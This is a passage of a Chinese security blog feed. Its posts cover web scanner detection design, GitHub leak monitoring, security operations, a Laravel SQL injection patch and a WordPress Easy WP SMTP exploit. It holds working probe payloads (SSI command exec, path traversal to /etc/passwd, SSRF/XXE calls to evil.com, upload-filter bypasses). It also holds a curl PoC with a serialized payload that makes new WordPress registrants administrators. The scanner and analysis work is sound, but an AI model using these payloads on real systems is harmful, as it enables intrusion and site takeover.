</ul>

<p>但是一般命令执行会有一定的过滤和其他限制，我们需要通过拼接和替换参数值的方式，去构造执行命令的语句，这时候我们就需要用payload去fuzz了。</p>

<h3 id="敏感信息泄露">敏感信息泄露</h3>

<p>对于敏感信息检测，可以通过关键词进行定位，方式主要有以下几种：</p>
<ul>
  <li>配置信息</li>
  <li>日志信息</li>
  <li>敏感api和路径</li>
  <li>cookie/token/明文密码/手机号等</li>
</ul>

<h3 id="crlf-注入">CRLF 注入</h3>

<p>检测是否成功注入header，这里有两个点需要注意：</p>
<ul>
  <li>不建议使用敏感的头部参数，可以生造一个set-header键值对，也方便检测。</li>
  <li>返回码需要为30x。</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>payload：
%0aset-header：ceshi;%0a

关键词：
ceshi
</code></pre>
</div>

<h3 id="ssti-注入">SSTI 注入</h3>

<p>我们可以通过对response中的回显进行关键词匹配：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>$\{\{11 * 11\}\}

121
</code></pre>
</div>

<h3 id="ssi-注入">SSI 注入</h3>

<p>检测方式类似于命令执行漏洞，采用替换参数值的方式，换取回显关键词和dns请求匹配。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;!--#exec cmd="cat /etc/passwd"--&gt;
root

&lt;!--#exec cmd="type c:\windows\win.ini"--&gt;
[extensions]
</code></pre>
</div>

<h3 id="cors漏洞">CORS漏洞</h3>

<p>cors漏洞检测主要通过response中的header关键词，进行相应的定位匹配：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Origin: http://www.baidu.com

Access-Control-Allow-Origin: http://www.baidu.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
</code></pre>
</div>

<h3 id="jsonp漏洞检测">JSONP漏洞检测</h3>

<p>jsonp漏洞需要依靠callback，利用场景简单提一下：</p>

<p>在响应中回调函数被硬编码：</p>
<ul>
  <li>基础函数调用</li>
  <li>对象方法调用</li>
</ul>

<p>动态调用回调函数：</p>
<ul>
  <li>URL完全可控（GET变量）</li>
  <li>URL部分可控（GET变量），但是附加有一个数字</li>
  <li>URL可控，但最初不会显示在请求之中</li>
</ul>

<p>那我们的检测方法可以这么做，先判断header是否存在：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Content-Type: application/json
</code></pre>
</div>

<p>再通过关键词定位json数据中，是否含有敏感数据。</p>

<h3 id="websocket劫持检测">WEBSOCKET劫持检测</h3>

<p>对于该漏洞，我们需要先检测header中是否含有Sec-WebSocket-Accept字段。</p>

<p>可以把Origin: https://www.baidu.com修改Origin: http://www.evil.com，若看到服务器端response status返回了 101，可以判定有漏洞。</p>

<h3 id="url跳转漏洞">URL跳转漏洞</h3>

<p>首先我们需要检测是否存在任意跳转漏洞，替换参数值为下面的内容：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>www.evil.com
@www.evil.com
\www.evil.com
\.www.evil.com
#www.evil.com
www.evil.com?vulnweb.cn
http://www.evil.com
http://www.evil.com?vulnweb.cn
evil.com
http://evil.com
</code></pre>
</div>

<p>然后，首先我们可以检测状态码为30x的response数据包里，是否Location解析出的域名为evil.com，亦或是定位evil.com特有可控的关键词。</p>

<p>其次，某些返回包可以能会通过中转页面，借助js进行跳转。</p>

<p>这时，我们可以选择去页面检测meta-refresh标签，以及检测以下标签：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>第1种：
&lt;script language="javascript" type="text/javascript"&gt;
　　window.location.href="login.jsp?backurl="+window.location.href;
　　&lt;/script&gt;
第2种：
&lt;script language="javascript"&gt;
　　alert("返回");
　　window.history.back(-1);
　　&lt;/script&gt;
第3种：
&lt;script language="javascript"&gt;
　　window.navigate("top.jsp");
　　&lt;/script&gt;
第4种：
&lt;script language="JavaScript"&gt;
　　self.location=’top.htm’;
　　&lt;/script&gt;
第5种：
&lt;script language="javascript"&gt;
　　alert("非法访问！");
　　top.location=’xx.jsp’;
　　&lt;/script&gt;
</code></pre>
</div>

<p>再者，我们可以采用更耗资源的暴力做法，直接用headless浏览器去发包，看是否落地域名是否为evil.com。</p>

<h3 id="文件读取漏洞lfi和rfi">文件读取漏洞（LFI和RFI）</h3>

<p>如果我们需要检测是否存在LFI，替换参数值对为下面的内容：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>追加：
../../../../../../../../../../../etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
../../../../../../../../../../windows/win.ini

替换：
c:\windows\win.ini
/etc/passwd

匹配关键词：
root
[extensions]
</code></pre>
</div>
<p>至于RFI在放在下面一起讲。</p>

<h3 id="ssrf漏洞">SSRF漏洞</h3>

<p>本漏洞可以可以跟RFI采用类似的检测办法，采用DNS服务器来读取请求。</p>

<p>这里提一下，如果是内网搭建DNS服务器，我们可以规避不能外联和内网IP限制的问题，能更精确的去进行检测。</p>

<p>检测关键词如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://vuln.evil.com/index.jsp
http://127.0.0.1/index.jsp
</code></pre>
</div>

<p>发包之后，如果存在漏洞，可以去DNS服务接口去读取到匹配vuln.evil.com（内网DNS服务器为evil.com）的结果；
又或是读取到的内容，是否已经匹配到index.jsp里的动态脚本标签。</p>

<h3 id="文件下载漏洞">文件下载漏洞</h3>

<p>这里用的payload是文件读取漏洞的那套，但是定位的返回关键词不同，我们可以定位response里的header：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Content-Type:application/octet-stream
</code></pre>
</div>

<h3 id="xxe漏洞">XXE漏洞</h3>

<p>检测xxe漏洞的时候，有两种情况可以尝试fuzz。</p>

<ul>
  <li>post参数值里含有xml标签时，这种情况可能需要把xxe payload编码发送。</li>
  <li>直接post了整个xml区块到server端，这种情况可以直接将整块xml区块，替换为xxe payload。</li>
  <li>整块的xml标签就不写出来了，这里给出附加的payload对,，同样是关键词+DNS服务监听：</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>payload:
file:///etc/passwd
file:///c:/windows/win.ini
http://xxx.evil.com

匹配关键词：
root
[extensions]
以及dns监听请求evil.com
</code></pre>
</div>

<h3 id="上传漏洞">上传漏洞</h3>

<p>上传漏洞的可操作的地方比较多，目前公布出的payload中，暂时还没有能完全囊括所有hack点，下面我们会以java为例简单讲讲。</p>

<h4 id="后缀">后缀</h4>
<p>在对java应用后缀绕过的时候，我们可以尝试对下面这些后缀进行fuzz：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>jjspsp
jspx
jspa
jtml
jsw
jsv
jspf
jsp
</code></pre>
</div>

<h4 id="冗余绕过">冗余绕过</h4>
<p>有些地方，我们进行了hack，但是却不影响数据包发送，比如：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Content-Disposition: form-data; name="myfile";;; filename="t3.jsp"

Content-Disposition2: form-data; name="Upload"; filename="1.jsp"

合成一行：
Content‐Disposition: form-data; name="img_crop_file"; filename="1.jsp"Content-Type: image/jpeg

Content‐Disposition: form‐data; name="up_picture"; filename="xss.js
p"

boundary后面加空格：
Content-Type: multipart/form-data; boundary= —————————47146314211411730218525550

Content-Disposition: form-data; filename="xx.jsp"; name="up_picture"

Content-Disposition: form-data; name="file_x"; filename="test.jpg"; filename="test.jsp"

Content-Disposition: form-data; name="Fhq"; test="5W个字符"; filename="test.jsp"

多个Content-Disposition可以用来绕过waf，一般server默认取的是第一个，但研究范围没有覆盖全java web server，有待验证。

绕过文件类型的验证：
Content-Type: image/jpeg

或者直接删除文件类型的验证：
Content-Type: xxxxx
</code></pre>
</div>

<p>检测上传文件有一个痛点，那就是不好自动化定位上传点。</p>

<p>对于<strong>有回显的情况</strong>，暂时有以下的解决办法：</p>

<ul>
  <li>
    <p>利用标签正则，手工定位返回的上传点，这种方法对于大规模扫描时不适用。</p>
  </li>
  <li>
    <p>寻找同一批response包里带有shell后缀的路径，做好web url拼接，暂存后利用shell标识去挨个判断，是否上传成功shell。</p>
  </li>
</ul>

<p>对于<strong>无回显的情况</strong>下：</p>

<p>如果黑盒测试，只能根据常用上传目录去爆破shell文件名，以获取到shell标识为成功。</p>

<p>否则的话，需要结合白盒定位，手动配置好路径，估算生成的文件名，去进行黑盒探测。</p>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Git监控小议]]></title>
      <url>/operation/2019/07/28/sec-git-monitor/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。</strong></span>
</p>

<p>那么，对于git方面的监控，我们应该做些什么呢？</p>

<h3 id="复合型监控">复合型监控</h3>

<h4 id="敏感关键词监控">敏感关键词监控</h4>

<p>对于类github监控，敏感关键词监控是基础，目前主要监控点有以下几种：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>敏感email地址
敏感多级子域名
ssh key
物理机key
云平台key
硬编码的pwd
关键域名+敏感路径+敏感key的拼接
（比如https://xxx/host/{ip}?key={YOUR_API_KEY}）
组织单位标识
关键数据库名、表格名、字段名、连接字符串
vpn配置字符串
smtp配置字符串
</code></pre>
</div>

<p>大部分类github平台，查询应该是需要登录的，这里以github举个例子。</p>

<p>我们可以用session认证，不过只有前100页的查询限制。</p>

<p>当然，大家也可以用key+api接口，个人没采用过这个接口，据说默认搜索前5000个项目。</p>

<p>所以利用好语法是很重要的，我们要精确地对需要监控的关键词，进行综合定位：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>搜索路径中有nsa的代码或者文件中有nsa的代码
nsa in:file,path

搜索用php写的包含userid的代码,文件名为flag，扩展名为txt
userid language:php filename:flag extension:txt

匹配关键字nsa且搜索大小为100字节的xml代码
nsa language:xml size:100

搜索conf目录下包含pass的xml代码
pass path:conf language:xml

除去名为normal_name的repo
-repo:normal_name

搜索star大于20，20&lt;fork&lt;30的项目
stars: &gt;20 fork: 20..30


</code></pre>
</div>
<p>另外，类github平台如果做了查询限制，可以考虑采用以下几点去绕过：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>IP池
多账号轮询
UA池
降频处理
</code></pre>
</div>

<h4 id="安全监控">安全监控</h4>

<p>在大一点的企业平台，做项目管控时，会接入gitlab或者类github平台的私有项目。</p>

<p>那么，如果要坚持精简的原则，我们需要完成哪些基础点呢？</p>

<p>第一，版本监控
每次漏洞大规模爆发时，常常需要去检查下，己方线上环境的组件，是否出于漏洞影响范围之内。</p>

<p>因此，维护和及时更新IT资产的checklist库，无论是实现的半自动化还是自动化监控，都是有一定积极作用的。</p>

<p>第二，安全审计
对于项目本身，我们需要做一些代码安全审计和日常扫描。</p>

<p>一般在代码上线，以及测试分支代码变更时，在条件允许的情况下，都应该触发自动化安全扫描。</p>

<p>在CI自动化和日常扫描时，一旦检测到问题，需要发送报告到安全运维人员过审，再决定要不要通告开发人员，去进行整改或者代码回退。</p>

<p>对于代码本身，可提供配置文件或者接口，供第三方软件，进行安全审计，这里不再多提。</p>

<h4 id="舆情监控">舆情监控</h4>

<p>现如今类github平台因为某些zz原因，成为了某些有心人撰写博客和放新闻的地方。</p>

<p>笔者当初做舆情监控接口的时候，也添加了对这类平台的接口支持，效果感觉尚可。</p>

<h3 id="平台优化tips">平台优化Tips</h3>

<h4 id="关键词定制">关键词定制</h4>

<p>如果我们在开发后期，想要去定制一些关键词咋办？</p>

<p>存在配置文件的情况下，我们可以做关键词命中。</p>

<p>一旦触发命中我们自己添加的关键词（不一定是标准搜索语法），也会直接通过微信或者邮件，将结果推送到负责人那里。</p>

<h4 id="规则可配置">规则可配置</h4>

<p>规则配置可以是多样化的，比如类github平台定期巡检，更新触发扫描，主动扫描检查。</p>

<p>多少时间没响应，会自动再次触发报警推送，多种方式报送警报消息。</p>

<p>制定repo或者author白名单，避免更多的误报。</p>

<p>优化读取的内容，指定显示关键词前后文行数。</p>

<p>设置关键词权重，避免大量冗余数据掩盖了低频高危数据。</p>

<h4 id="污点化">污点化</h4>

<p>在为了防止企业git项目被泄露到公网，我们在命名规范时，可以尝试制定编码规范，必须带上容易识别的特征，或者带上关键词。</p>

<p>这样有个好处，在代码泄露时能及时监控到，但防君子不防小人，内部人员可能会做关键词替换。但这种情况，也可以通过一些特殊技巧去提升保密性。</p>

<p>另外，白帽子提交速度可能比监控响应更快，这就需要考验规范制定者的素质了。</p>

<h4 id="参考文章">参考文章</h4>

<p><a href="https://www.freebuf.com/articles/web/150638.html">深入分析一款简单的Github信息泄露爬虫</a></p>

<p><a href="https://blog.csdn.net/xpx1995/article/details/79031397">Github代码高级搜索小技巧</a></p>

<p><a href="https://www.freebuf.com/sectool/114017.html">基于Github的源码白盒扫描工具Raptor</a></p>

<p><a href="https://www.freebuf.com/column/178342.html">Github信息泄露专项</a></p>
]]></content>
      <categories>
        
          <category> operation </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[安全运维优化思考]]></title>
      <url>/operation/2019/07/13/sec-operation/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。</strong></span>
</p>

<h4 id="资产统计与变更">资产统计与变更</h4>
<p>这段时间正好碰上了FastJson漏洞爆发。由于笔者所在的甲方，属于有一定规模的互联网公司，所以近期也在连夜配合各业务部门进行漏洞修补。</p>

<p>虽然公司本身具有强大的统计平台，也具有较为成熟的资产规范，但还是花了大量时间去统计、升级那些受影响的资产。</p>

<p>举个例子，自家公司的It资产已经接入了自动化运维，采用了基于的ES集群的平台。资产的变更能够及时以*key为基准，计入全局搜索，方便以后搜索和资产统计，以及后续的自动化升级和部署。</p>

<p>但这种统一部署变更的法子，也存在部分痛点。其中的一个就是，一旦基于ES部署平台和Agent自身存在问题，如果没有得到及时修复的话，其自身不小的体量，可能会影响全局资产的修复进度。</p>

<p>因此，拥有多份资产升级/变更/检测方案，能做到轻量/重量级方案互相制约，窃以为还是有必要的。</p>

<p>另外，如果做好了内网Git资产梳理，通过代码扫描定位可能存在的漏洞和服务，也是能辅助统计受影响的资产的。</p>

<h4 id="自动化检测认证">自动化检测认证</h4>
<p>对于大型甲方，如果安全团队在研究好新出的漏洞Poc，对IT资产安全进行自检的时候，如果按正常流程去做，可能首先应该是先进行任务申请上报，然后向全集团发邮件，最后再进行扫描。</p>

<p>不过，在碰上比较紧急的漏洞应急时，在跨部门协作的情况下，经常会来不及走完所有流程。</p>

<p>笔者也曾见过研发、运维等部门，因为突然查到攻击Log，半夜一惊一乍的，去找安全部门验证攻击来源是否属于内部自检。</p>

<p>那么针对这一点，如何做去做优化呢？</p>

<p>不少大型企业，有时会采用统一的签名和加密机制，或者直接构建单独的平台，用于保证传输加密的可信认证。</p>

<p>笔者窃以为，这点是可以借鉴的。如果能做好一定范围内的成本控制，在每次做自动化安全检测的时候，将加密认证信息加入检测数据包头部，以用作内部安全检测的授信，各个BU会更加轻松的识别出真实的攻击事件。</p>

<h4 id="敏感数据泄漏控制">敏感数据泄漏控制</h4>
<p>防止敏感数据的泄漏，以及进行事后的责任追溯，一直是甲方比较重视的点，据悉大致有这样几种方案：</p>

<p>1.DLP数据防泄漏</p>

<p>DLP软件一般是为了定位公司敏感数据外发行为，对于数据流量内容进行监控审计，现在市面上也有了不少成熟的合规产品。</p>

<p>2.堡垒机</p>

<p>堡垒机上具有监控，限制数据传输和全程录屏等功能，配合查询系统的水印功能，也能在一定程度上防止数据泄漏，以及对泄漏源进行追溯。</p>

<p>3.数据脱敏</p>

<p>在存储和展示敏感数据的时候，本身应该做好脱敏操作，对于数据进行加密存储和非完全展示，防止内鬼和意外泄漏事件发生。</p>

<p>4.数据监控</p>

<p>虽然如同Github监控和舆情监控一般的产品，并不能有效抑制数据泄漏。但在防止数据扩散，以及追溯数据泄漏来源的层面来看，还是比较有用的。</p>

<p>如果能综合利用多类产品，再加上企业本身的安全管理规范，应该是能够在一定程度上保证数据安全的。</p>

<h4 id="产品检测流程">产品检测流程</h4>
<p>在原来的乙方安全测试岗位，如果需要对产品做安检的时候，随便去咨询个资深的相关产品、售前或者研发，基本上都能问出个所以然来。</p>

<p>然而到了现在的甲方安全运维岗，可就厉害了。在工作流程细化和文档化以后，需要做安全检测时，得挨个询问多个QA/RD/PM，一点一点把他们的需求和设计方案抠出来，最后还得去找API文档自己做补充和完善，才能进行下一步的操作。</p>

<p>笔者这两天还去拜访了一家非互联网甲方，跟那边负责安全的Leader朋友聊了下，产品上线合规的紧要性，确实是远优先于安全合规的，当然这个也是不得已而为之。</p>

<p>总的来说，合规化有益于流程梳理，简化有益于加速产品上线，也算各有各的好处吧。</p>

<p>当然笔者见识有限，窥一斑而不得见全豹。但总的来说，确实可以根据不同产品的实际情况，去对流程进行一些灵活变通。</p>

<h4 id="后记">后记</h4>
<p>以上只是简单谈了一些感受，这方面的工作资历尚浅，期待各路读者斧正和指教。</p>

]]></content>
      <categories>
        
          <category> operation </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP开发框架LaravelのSQL注入漏洞分析]]></title>
      <url>/bug/2019/03/26/php-framework-Laravel-sqli/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。</strong></span>
</p>

<p>首先，这个漏洞属于网站coding写法不规范，官方给了提示：</p>

<p><img src="http://ww1.sinaimg.cn/large/697f6f27ly1g1gby7vp5qj20hx03ht8x.jpg" alt="" /></p>

<p>但官方还是做了修补，升级最新版本V5.8.7可修复。</p>

<p>我们先定位下这里：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rule
</code></pre>
</div>
<p>官方推荐的写法是：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Rule::unique('users')-&gt;ignore($id),
</code></pre>
</div>
<p>但如果网站没有预先对$id的值做处理时，用户可以传递恶意数据给ignore函数，就会导致SQL注入。</p>

<p>我们来跟一下函数：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>\Illuminate\Validation\Rules\Unique.php

class Unique
{
...
public function ignore($id, $idColumn = null)
    {
        if ($id instanceof Model) {
            return $this-&gt;ignoreModel($id, $idColumn);
        }

        $this-&gt;ignore = $id;
        $this-&gt;idColumn = $idColumn ?? 'id';

        return $this;
    }

</code></pre>
</div>
<p>这里我们不考虑把$id写成实例的情况，$id是用户可控的话，$idColumn直接写为空即可，最后赋值情况如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$this-&gt;ignore = $id;
$this-&gt;idColumn = 'id';
</code></pre>
</div>

<p>如果网站代码类似这样构造的话，黑客输入的值就属于可控状态：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$id = $request-&gt;input('id');
</code></pre>
</div>
<p>最后我们会走到这儿：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\Unique.php

    public function __toString()
    {
        ...
        ...
    }
</code></pre>
</div>

<p>我们看下关键的代码变更：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\Unique.php

V5.8.7【最新版】
    public function __toString()
    {
            $this-&gt;ignore ? '"'.addslashes($this-&gt;ignore).'"' : 'NULL',
    }
</code></pre>
</div>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\Unique.php

V5.8.4
    public function __toString()
    {

            $this-&gt;ignore ? '"'.$this-&gt;ignore.'"' : 'NULL',

    }
</code></pre>
</div>
<p>这里最新的代码v5.8.7，把$this-&gt;ignore直接给addslashes了，以前这里是没有防护的。</p>

<p>有趣的是，笔者对比了下diff，期间官方还试图对其他引用的地方进行了过滤。最后还是改成了__toString处，进行统一过滤的方式。</p>

<p>最后提一句，后面的代码会进入DatabaseRule，进行后续SQL规则匹配。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\DatabaseRule.php
</code></pre>
</div>

<p>这之后就没有再进一步处理，接着形成了SQL注入。</p>

<p>参考链接：</p>

<p><a href="https://blog.laravel.com/unique-rule-sql-injection-warning?fbclid=IwAR26Cs1Ewh983UxSF5fNO8Xr0hUnwSO_Ikbr08Adi20m5h5llP0WhNDmgRg">官方通告</a></p>

<p><a href="https://laravel.com/docs/5.8/validation#rule-unique">说明文档</a></p>

]]></content>
      <categories>
        
          <category> bug </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[WordPress Easy WP SMTP反序列化漏洞分析]]></title>
      <url>/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</strong></span>
</p>

<p>首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。</p>

<p>关键函数位置在：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
</code></pre>
</div>
<p>这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。</p>

<p>然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
/wp-admin/admin.php的注释里对admin_init解释道：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
</code></pre>
</div>

<p>我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：</p>

<p>网上给出的poc：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

</code></pre>
</div>

<p>网上的poc是利用函数中的一个导入配置文件的功能：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
</code></pre>
</div>
<p>在导入以后，他会对文件内容进行一个反序列化解析：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$in = unserialize( $in_raw );
</code></pre>
</div>
<p>我们可以使用下面的array:</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="err">[</span><span class="nt">"users_can_register"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(1)</span><span class="w"> </span><span class="nt">"1"</span><span class="w">
  </span><span class="err">[</span><span class="nt">"default_role"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(13)</span><span class="w"> </span><span class="nt">"administrator"</span><span class="w">
</span><span class="err">}</span><span class="w">
</span></code></pre>
</div>
<p>序列化以后成为：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}"
</code></pre>
</div>
<p>再次组合array：</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="err">[</span><span class="nt">"data"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(81)</span><span class="w"> </span><span class="nt">"a:2:{s:18:"</span><span class="err">users_can_register</span><span class="nt">";s:1:"</span><span class="err">1</span><span class="nt">";s:12:"</span><span class="err">default_role</span><span class="nt">";s:13:"</span><span class="err">administrator</span><span class="nt">";}"</span><span class="w">
  </span><span class="err">[</span><span class="nt">"checksum"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(32)</span><span class="w"> </span><span class="nt">"3ce5fb6d7b1dbd6252f4b5b3526650c8"</span><span class="w">
</span><span class="err">}</span><span class="w">

</span></code></pre>
</div>
<p>第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}
</code></pre>
</div>

<p>简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$in = unserialize( $in_raw );
if ( empty( $in[ 'data' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( empty( $in[ 'checksum' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
	 echo $err_msg;
	 wp_die();
}
</code></pre>
</div>
<p>我们可以看到，需要绕过两个部分：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>unserialize( $in_raw );
unserialize( $in['data'] )
</code></pre>
</div>
<p>经过两次反序列化的结果后，data的内容，也就是下面的数组：</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="err">[</span><span class="nt">"users_can_register"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(1)</span><span class="w"> </span><span class="nt">"1"</span><span class="w">
  </span><span class="err">[</span><span class="nt">"default_role"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(13)</span><span class="w"> </span><span class="nt">"administrator"</span><span class="w">
</span><span class="err">}</span><span class="w">
</span></code></pre>
</div>
<p>才能分拆为key-value，进入后续函数：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>foreach ( $data as $key =&gt; $value ) 
{
	    update_option( $key, $value );
}
</code></pre>
</div>

<p>users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来…</p>

<p>下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>/wp-includes/option.php::update_option
</code></pre>
</div>
<p>我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$value = apply_filters( "pre_update_option_{$option}", $value, $old_value, $option );
$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
	
if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
{
	return false;
}

$result = $wpdb-&gt;update( $wpdb-&gt;options, $update_args, array( 'option_name' =&gt; $option ) );
</code></pre>
</div>
<p>附上数据库wp_options表查询的最初始的默认结果：
<img src="http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg" alt="" /></p>

<p>本文可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。</p>

<p>引用文章：</p>

<p><a href="https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/">Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.</a></p>
]]></content>
      <categories>
        
          <category> bug </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[分布式扫描填坑杂谈]]></title>
      <url>/scanner/2019/01/15/talk-about-scanner-settings/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</strong></span>
</p>

<p>在本文中，将简单谈谈我这边采用的技术栈，有关对分布式填坑的经历，大家注意这里依旧是采用的python code。</p>

<ul>
  <li>celery库版本</li>
</ul>

<p>以root权限启动root的问题，低版本不识别，会报错，这里使用的是celery==3.1.2x。</p>
<div class="highlighter-rouge"><pre class="highlight"><code>from celery import Celery, platforms
platforms.C_FORCE_ROOT = True

</code></pre>
</div>

<ul>
  <li>redis库版本</li>
</ul>

<p>版本不合适，或者worker和server版本不对等的话，可能出现celery worker 开启不久就offline的问题，或者redis会不时的掉线重连。</p>

<p>这里把redis库的版本，从原来的redis==3.0.x降级到redis==2.10.x，基本解决了上述bug。</p>

<p>需要注意的是，在celery高版本的时候（比如4.x），可能会需要匹配3.x的redis库，大家看情况而定。</p>

<ul>
  <li>重连机制</li>
</ul>

<p>我们这里在后端存储结果，考虑到复杂sql交叉调用，还是采用的关系数据库mysql。</p>

<p>局域网中数据库写入，需要考虑重连机制，常用的如MySQLdb库，原生无重连机制，需要自己重写。</p>

<p>这里推荐两个模块，都支持重连：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>torndb
facebook开源的一个基于MySQLdb二次封装的一个mysql模块。
pymysql
比较常用，需要python3。
</code></pre>
</div>

<ul>
  <li>加强存取稳定性</li>
</ul>

<p>如果想要加强局域网数据存取的稳定性，除了把上述的超时和重连配置好以外，暂时有两个办法：</p>

<blockquote>
  <p>第一：可以将存入局域网数据库服务器失败的数据，暂存本地关系数据库。采用定时调度器，或者监控网络空闲时，再进行同步
。</p>
</blockquote>

<blockquote>
  <p>第二：可以将命令或者数据直接写入本地中间件，当监控到网络空闲时间，自动同步。</p>
</blockquote>

